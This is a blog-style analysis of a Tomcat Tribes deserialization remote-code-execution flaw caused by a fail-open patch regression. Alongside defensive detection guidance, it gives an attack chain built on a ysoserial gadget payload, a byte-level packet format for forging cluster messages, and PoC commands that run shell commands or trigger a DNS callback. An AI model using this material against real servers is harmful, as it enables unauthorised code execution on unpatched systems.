---
layout: post
title: "When the Fix Breaks Everything: Tomcat Tribes RCE (CVE-2026-34486)"
date: 2026-04-20
categories: [vulnerability-analysis, deserialization]
tags: [cve-2026-34486, tomcat, deserialization, rce, cisa-kev]
cve: CVE-2026-34486
cvss: "7.5 High (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)"
affected: "Tomcat 9.0.116, 10.1.53, 11.0.20"
fixed: "9.0.117, 10.1.54, 11.0.21"
cwe: "CWE-311 (Missing Encryption of Sensitive Data)"
author: P1ck
---

There's a particular kind of frustration reserved for security teams who do everything right.
They catch the advisory, prioritize the patch, roll it out ahead of schedule -- only to
discover the patch itself opened a hole that didn't exist before.

CVE-2026-34486 is one of those bugs. Apache Tomcat's Tribes clustering module had a padding
oracle vulnerability ([CVE-2026-29146]). The fix landed in versions 9.0.116, 10.1.53, and
11.0.20. But that fix introduced a one-line regression that silently disabled encryption
enforcement. The result: any attacker who could reach the Tribes receiver port could inject
raw Java serialized objects straight into `ObjectInputStream.readObject()` -- no filter, no
authentication, no encryption check.

CISA added it to the Known Exploited Vulnerabilities catalog on April 16, 2026. PoC code is
public. The bug was hiding in plain sight for anyone who had *just patched*.

[CVE-2026-29146]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-29146

## The Component

Tomcat Tribes is the built-in clustering module for session replication between nodes. Nodes
talk to each other over TCP, default port 4000, using a binary protocol. When you want
encryption in the cluster, you configure an `EncryptInterceptor` in the interceptor chain.
It sits between the network receiver and the application layer, encrypting outbound messages
and decrypting inbound ones.

The contract is straightforward: if a message can't be decrypted, it gets dropped. That's
the entire point of the interceptor. Without it, anyone on the network could inject
arbitrary cluster messages.

## The Regression

The CVE-2026-29146 fix restructured error handling in `EncryptInterceptor.messageReceived()`.
Before the fix:

```java
try {
    decrypt(msg);
    super.messageReceived(msg);  // forward after successful decrypt
} catch (GeneralSecurityException e) {
    // drop the message
}
```

After the fix (versions 9.0.116, 10.1.53, 11.0.20):

```java
try {
    decrypt(msg);
} catch (GeneralSecurityException e) {
    log.error("decrypt failed", e);
}
super.messageReceived(msg);  // ALWAYS executes, even on decrypt failure
```

One line moved outside the try/catch. The catch block logs the error but doesn't return.
The message -- still containing the attacker's raw, unencrypted bytes -- continues up the
interceptor chain as if nothing happened.

This is a textbook fail-open regression. The kind that's almost invisible in code review
because both versions look reasonable in isolation.

## The Deserialization Sink

After passing through the interceptor chain, the message arrives at
`GroupChannel.messageReceived()`. This method checks the `options` field on the incoming
message. If the `SEND_OPTIONS_BYTE_MESSAGE` flag (bit 0x0001) is **not** set, meaning
`options == 0`, the code calls:

```java
XByteBuffer.deserialize(
    msg.getMessage().getBytes(),
    0,
    msg.getMessage().getLength(),
    null
);
```

Which internally does:

```java
ObjectInputStream stream = new ObjectInputStream(instream);
message = stream.readObject();
```

No `ObjectInputFilter`. No class whitelist. No sandbox. Raw `readObject()` on
attacker-controlled data.

If the classpath contains a usable gadget chain -- `commons-collections-3.x` being the
usual suspect -- this gives you arbitrary code execution as the Tomcat process user.

## The Attack Chain

In practice, exploitation looks like this:

1. **Recon**: Find a Tomcat node with TCP/4000 reachable from your position.
2. **Generate payload**: Use ysoserial's `CommonsCollections6` to produce a serialized
   gadget chain that executes your command.
3. **Wrap in Tribes protocol**: Package the serialized bytes into a valid Tribes packet
   with the correct framing.
4. **Send**: Single TCP connection, single packet. No handshake, no authentication.
5. **Bypass**: `EncryptInterceptor` tries to decrypt, fails with `AEADBadTagException`,
   logs the error, forwards the message anyway.
6. **Deserialize**: `GroupChannel` calls `readObject()` on the raw bytes.
7. **Execute**: The gadget chain runs.

The Tribes protocol has no authentication at the framing layer. The `NioReceiver` accepts
any TCP connection. There's no membership verification on the data channel -- the
`ChannelCoordinator.accept()` method returns `true` unconditionally.

## The Wire Protocol

For detection engineering and reproduction, the packet format matters. A Tribes packet on
the wire:

```
[FLT2002] [data_len: 4B big-endian] [ChannelData] [TLF2003]
```

The `ChannelData` structure:

| Offset | Length | Field | Notes |
|--------|--------|-------|-------|
| 0 | 4B | options | Must be `0x00000000`. Bit 0x0001 triggers ByteMessage path, no deserialization. |
| 4 | 8B | timestamp | Arbitrary value. |
| 12 | 4B | uniqueId length | Always 16. |
| 16 | 16B | uniqueId | Arbitrary bytes. |
| 32 | 4B | address length | Length of MemberImpl binary that follows. |
| 36 | N | MemberImpl | Sender address (see below). |
| 36+N | 4B | message length | Length of the serialized payload. |
| 40+N | M | message | Java serialized object. |

The `MemberImpl` binary wraps the fake sender address:

```
[TRIBES-B\x01\x00] [body_len: 4B] [alive: 8B] [port: 4B] [securePort: 4B = -1]
[udpPort: 4B = -1] [hostLen: 1B] [host] [cmdLen: 4B = 0] [domainLen: 4B = 0]
[uniqueId: 16B] [payloadLen: 4B = 0] [TRIBES-E\x01\x00]
```

The receiver does not validate that the claimed sender is a known cluster member. You can
put any IP in the host field.

## Reproducing

We built a Docker environment that stands up Tomcat 9.0.116 with Tribes clustering,
EncryptInterceptor, and commons-collections 3.2.2 on the classpath:

```bash
git clone https://github.com/P1ck/VulnForge
cd vulnerabilities/tomcat/CVE-2026-34486/lab
docker compose up -d --build

# Wait for startup (~30s), then verify
curl http://localhost:8080/
```

The PoC ([`exploit/poc.py`][poc]) constructs a raw Tribes packet wrapping a ysoserial
payload:

```bash
# DNS callback detection -- no gadget library needed on target
python3 poc.py -t 127.0.0.1 --urldns http://your-subdomain.dnslog.cn

# Remote code execution
python3 poc.py -t 127.0.0.1 --cmd "id > /tmp/cve-2026-34486"

# Verify
docker exec cve-2026-34486-tomcat cat /tmp/cve-2026-34486
```

[poc]: https://github.com/P1ck/VulnForge/blob/main/vulnerabilities/tomcat/CVE-2026-34486/exploit/poc.py

After sending the payload, check the Tomcat logs:

```
SEVERE [NioReceiver] encryptInterceptor.decrypt.failed
  javax.crypto.AEADBadTagException: Tag mismatch!
```

That line means the bypass worked. The message was forwarded before the error was logged.

## Who's Actually Affected

Three specific versions:

| Branch | Vulnerable | Fixed |
|--------|-----------|-------|
| 9.x | 9.0.116 | 9.0.117 |
| 10.x | 10.1.53 | 10.1.54 |
| 11.x | 11.0.20 | 11.0.21 |

These are *exactly* the versions that contained the CVE-2026-29146 fix. If you patched for
the padding oracle, you're the one at risk. Tomcat 8.5.x and earlier aren't affected because
the `EncryptInterceptor` component doesn't exist in that branch.

That said, three preconditions limit the blast radius:

1. **Tribes clustering must be enabled** -- not a default configuration.
2. **EncryptInterceptor must be in the interceptor chain** -- an explicit hardening step.
3. **A gadget library on the classpath** -- `commons-collections-3.x` is common but not
   guaranteed.

The exposed surface is narrower than something like CVE-2023-46604 (ActiveMQ OpenWire RCE).
But the teams most likely to be affected are those running clustered Tomcat with encryption
enabled -- which is exactly the set of teams that would have prioritized the original
CVE-2026-29146 patch.

## Detection

**Network level**: Watch for TCP connections to port 4000 (or custom Tribes ports) from
non-cluster IPs. The Java serialization magic bytes (`AC ED 00 05`) appearing in traffic
to this port are a clear indicator. Snort published rules under SID 66250+.

**Tomcat logs**: Search `catalina.out` for `encryptInterceptor.decrypt.failed`. On patched
versions, decryption failures result in the message being dropped. On vulnerable versions,
the message continues processing, and you may see subsequent deserialization errors
(`ClassNotFoundException`, `StreamCorruptedException`).

**Host level**: Monitor for suspicious child processes spawned by the Tomcat JVM --
`cmd.exe`, `powershell.exe`, `bash`, `curl`, `wget`. These are post-exploitation indicators.

**Suricata rules and Sigma detection rules** are available in the
[VulnForge repository][detection].

[detection]: https://github.com/P1ck/VulnForge/tree/main/vulnerabilities/tomcat/CVE-2026-34486/detection

## The Bigger Picture

This vulnerability is a case study in how security fixes can be more dangerous than the
bugs they address. The original padding oracle required an active man-in-the-middle
position and sophisticated cryptographic work. The regression reduced the attack to a
single unauthenticated TCP packet.

The timing made things worse. CISA added CVE-2026-34486 to the KEV catalog on April 16,
just days after the fixed versions shipped. PoC code was public before many teams had
finished rolling out the fix for the *original* vulnerability.

The lesson is straightforward: when you patch a security vulnerability in encryption or
authentication logic, verify that the patched version doesn't introduce new failures.
Especially fail-open failures. Especially one-line regressions that are nearly invisible
in code review.

## Timeline

| Date | Event |
|------|-------|
| 2026-03-xx | Tomcat 9.0.116, 10.1.53, 11.0.20 released (CVE-2026-29146 fix, regression introduced) |
| 2026-04-02 | Tomcat 10.1.54 released (fix) |
| 2026-04-03 | Tomcat 9.0.117 released (fix) |
| 2026-04-04 | Tomcat 11.0.21 released (fix) |
| 2026-04-09 | QAX CERT advisory |
| 2026-04-14 | Snort SID 66250+ published |
| 2026-04-16 | CISA KEV entry (confirmed in-the-wild exploitation) |

## References

- [NVD: CVE-2026-34486](https://nvd.nist.gov/vuln/detail/CVE-2026-34486)
- [Apache Security Mailing List](https://lists.apache.org/thread/9510k5p5zdvt9pkkgtyp85mvwxo2qrly)
- [GitHub Advisory GHSA-69r9-qgr7-g2wj](https://github.com/advisories/GHSA-69r9-qgr7-g2wj)
- [SOCRadar Technical Analysis](https://socradar.io/blog/cve-2026-34486-apache-tomcat-tribes-rce/)
- [HeroDevs CVE Round-Up](https://www.herodevs.com/blog-posts/apache-tomcat-cve-round-up-10-vulnerabilities-patched-across-tomcat-9-10-and-11-april-2026)
